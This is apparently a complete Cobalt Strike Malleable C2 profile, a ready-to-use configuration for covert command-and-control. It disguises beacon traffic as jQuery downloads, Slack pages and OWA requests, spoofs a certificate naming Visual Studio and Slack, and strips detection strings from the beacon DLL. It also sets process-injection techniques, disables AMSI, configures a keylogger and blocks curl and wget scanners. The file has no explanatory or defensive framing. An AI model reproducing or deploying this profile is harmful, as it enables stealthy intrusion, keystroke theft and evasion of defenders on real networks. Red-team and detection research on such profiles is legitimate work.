set host_stage "true";
set sleeptime "13000";
set jitter    "23";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36";

set data_jitter "50";
#set smb_frame_header "\x80";
set pipename "W32TIME_ALT_3377";
set pipename_stager "W32TIME_ALT_1564";

set tcp_frame_header "\x80";
set ssh_banner "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename "W32TIME_ALT_##";
set tcp_port "48536";

https-certificate {
set CN       "code.visualstudio.com"; #Common Name
set O        "Slack Technologies Inc"; #Organization Name
set C        "US"; #Country
set L        "San Francisco"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "CA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}

# code-signer {
#     set keystore "/root/cert/cscert.jks";
#     set password "asecret";
#     set alias    "1";
#     set timestamp_url "http://timestamp.globalsign.com/scripts/timestamp.dll";
# }


dns-beacon {
    set dns_max_txt        "184";
    set dns_ttl            "5";
    set maxdns             "200";
    set dns_stager_prepend   "doc-stg-prepend";
    set dns_stager_subhost   "doc-stg-sh.";

    set beacon               "doc.bc.";
    set get_A                "doc.1a.";
    set get_AAAA             "doc.4a.";
    set get_TXT              "doc.tx.";
    set put_metadata         "doc.md.";
    set put_output           "doc.po.";
    set ns_response          "zero";

}

http-stager {  
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}


stage {
    set magic_mz_x86   "H@KC";
    set magic_mz_x64   "AYAQ";
    set magic_pe       "NO";
    set obfuscate "true";
    set stomppe "true";
    set cleanup "true";
    set userwx "false";
    set smartinject "true";
    

    #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
    #They will also obfuscate themselves while they wait to read information from their parent Beacon.
    set sleep_mask "true";
    

    set checksum       "0";
    set entry_point    "263424";
    set image_size_x86 "495616";
    set image_size_x64 "495616";
    set name           "Windows.UI.BlockedShutdown.dll";
    set rich_header    "\xe4\xce\xe6\x5e\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa0\xaf\x88\x0d\xa9\xd7\x1b\x0d\x96\xaf\x88\x0d\xfb\xc7\x8b\x0c\xa3\xaf\x88\x0d\xfb\xc7\x8c\x0c\x9f\xaf\x88\x0d\xfb\xc7\x8d\x0c\xb8\xaf\x88\x0d\xfb\xc7\x89\x0c\xa9\xaf\x88\x0d\xa0\xaf\x89\x0d\xb9\xae\x88\x0d\xfb\xc7\x88\x0c\xa1\xaf\x88\x0d\xfb\xc7\x81\x0c\xac\xaf\x88\x0d\xfb\xc7\x77\x0d\xa1\xaf\x88\x0d\xfb\xc7\x8a\x0c\xa1\xaf\x88\x0d\x52\x69\x63\x68\xa0\xaf\x88\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    
    
    transform-x86 {
        prepend "\x90\x90\x90"; # NOP, NOP!
        strrep "ReflectiveLoader" "";
        strrep "This program cannot be run in DOS mode" "";
        strrep "NtQueueApcThread" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "Stack memory was corrupted" "";
        strrep "beacon.dll" "";
        strrep "ADVAPI32.dll" "";
        strrep "WININET.dll" "";
        strrep "WS2_32.dll" "";
        strrep "DNSAPI.dll" "";
        strrep "Secur32.dll" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualProtect" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualFree" "";
        strrep "VirtualQuery" "";
        strrep "RtlVirtualUnwind" "";
        strrep "sAlloc" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "CreateSemaphoreExW" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "SetThreadpoolTimer" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "SetThreadpoolWait" "";
        strrep "CloseThreadpoolWait" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "CompareStringEx" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "IsValidLocaleName" "";
        strrep "LCMapStringEx" "";
        strrep "GetCurrentPackageId" "";
        strrep "UNICODE" "";
        strrep "UTF-8" "";
        strrep "UTF-16LE" "";
        strrep "MessageBoxW" "";
        strrep "GetActiveWindow" "";
        strrep "GetLastActivePopup" "";
        strrep "GetUserObjectInformationW" "";
        strrep "GetProcessWindowStation" "";
        strrep "Sunday" "";
        strrep "Monday" "";
        strrep "Tuesday" "";
        strrep "Wednesday" "";
        strrep "Thursday" "";
        strrep "Friday" "";
        strrep "Saturday" "";
        strrep "January" "";
        strrep "February" "";
        strrep "March" "";
        strrep "April" "";
        strrep "June" "";
        strrep "July" "";
        strrep "August" "";
        strrep "September" "";
        strrep "October" "";
        strrep "November" "";
        strrep "December" "";
        strrep "MM/dd/yy" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "RegOpenKeyExW" "";
        strrep "egQueryValueExW" "";
        strrep "RegCloseKey" "";
        strrep "LibTomMath" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "Kerberos" "";

        }

    transform-x64 {
        prepend "\x90\x90\x90"; # NOP, NOP!
        strrep "ReflectiveLoader" "";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.x64.dll" "";
        strrep "NtQueueApcThread" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "Stack memory was corrupted" "";
        strrep "beacon.dll" "";
        strrep "ADVAPI32.dll" "";
        strrep "WININET.dll" "";
        strrep "WS2_32.dll" "";
        strrep "DNSAPI.dll" "";
        strrep "Secur32.dll" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualProtect" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualFree" "";
        strrep "VirtualQuery" "";
        strrep "RtlVirtualUnwind" "";
        strrep "sAlloc" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "CreateSemaphoreExW" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "SetThreadpoolTimer" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "SetThreadpoolWait" "";
        strrep "CloseThreadpoolWait" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "CompareStringEx" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "IsValidLocaleName" "";
        strrep "LCMapStringEx" "";
        strrep "GetCurrentPackageId" "";
        strrep "UNICODE" "";
        strrep "UTF-8" "";
        strrep "UTF-16LE" "";
        strrep "MessageBoxW" "";
        strrep "GetActiveWindow" "";
        strrep "GetLastActivePopup" "";
        strrep "GetUserObjectInformationW" "";
        strrep "GetProcessWindowStation" "";
        strrep "Sunday" "";
        strrep "Monday" "";
        strrep "Tuesday" "";
        strrep "Wednesday" "";
        strrep "Thursday" "";
        strrep "Friday" "";
        strrep "Saturday" "";
        strrep "January" "";
        strrep "February" "";
        strrep "March" "";
        strrep "April" "";
        strrep "June" "";
        strrep "July" "";
        strrep "August" "";
        strrep "September" "";
        strrep "October" "";
        strrep "November" "";
        strrep "December" "";
        strrep "MM/dd/yy" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "RegOpenKeyExW" "";
        strrep "egQueryValueExW" "";
        strrep "RegCloseKey" "";
        strrep "LibTomMath" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "Kerberos" "";
        }
}


process-inject {
    # set remote memory allocation technique
    set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "33168";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2075";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
    }
}

post-ex {
    # control the temporary process we spawn to
    
    set spawnto_x86 "%windir%\\syswow64\\gpresult.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
    
    # control the method used to log keystrokes 
    set keylogger "GetAsyncKeyState";
}


http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=5, max=2";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {

    set uri "/messages/Smdy-DhIUjw0egVpxCAeZ1 /messages/Z9r7WWRpf5LKoxEjleD2Vs /messages/A5bWGvD9fHtZHlRTCuknkbzdU /messages/WOaipHjYK3XQyqFZdX3R5AqOadA-dmn /messages/cLyiGzNWSmffJPw6rhK9tk ";


    client {

        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

            
            metadata {
            base64url;
            append ";_ga=GA1.2.875";
            append ";__ar_v4=%8867UMDGS643";
            prepend "d=";
            prepend "_ga=GA1.2.875;";
            prepend "b=.12vPkW22o;";
            header "Cookie";

            }

    }

    server {

        header "Content-Type" "text/html; charset=utf-8";
        header "Connection" "close";
        header "Server" "Apache";
        header "X-XSS-Protection" "0";
        header "Strict-Transport-Security" "max-age=30160871; includeSubDomains; preload";
        header "Referrer-Policy" "no-referrer";
        header "X-Slack-Backend" "h";
        header "Pragma" "no-cache";
        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Vary" "Accept-Encoding";
        header "X-Via" "haproxy-www-w6k7";
        

        output {

            base64url;

            prepend "<!DOCTYPE html>
        <html lang=\"en-US\" class=\"supports_custom_scrollbar\">

        <head>

        <meta charset=\"utf-8\">
        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
        <meta name=\"referrer\" content=\"no-referrer\">
        <meta name=\"superfish\" content=\"nofish\">
            <title>Microsoft Developer Chat Slack</title>
        <meta name=\"author\" content=\"Slack\">
            

        <link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";

            append "\"> </script>";
            
            append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">


        <div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">
        <h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>

        <div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">
            Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.		<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>
        </div>

        <div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">
            We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\"inline_block no_wrap\">
                <button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •
                <button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •
                <button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>
            </span>
        </div>";

            print;
        }
    }
}

http-post {
    set uri "/owa/CNafi9h2FE9j9310fwJR6SQ20vHq /owa/OppZDWgKUnPNwPmQPUmzP /owa/UwHufs37crbGXGLLSHi-UzhYmxV /owa/GVuCNhopJjiQqSXOlp8Y956HkOfBYXT /owa/IcfiDDpvbF6jmpeQlwZv-GWqp1nL";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }
    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}

http-stager {

    set uri_x86 "/messages/DALBNSf24";
    set uri_x64 "/messages/DALBNSF25";

    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "Connection" "close";
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";        
        header "Connection" "close";
        header "Server" "Apache";
        header "X-XSS-Protection" "0";
        header "Strict-Transport-Security" "max-age=17956610; includeSubDomains; preload";
        header "Referrer-Policy" "no-referrer";
        header "X-Slack-Backend" "h";
        header "Pragma" "no-cache";
        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Vary" "Accept-Encoding";
        header "X-Via" "haproxy-www-suhx";

    }


}	
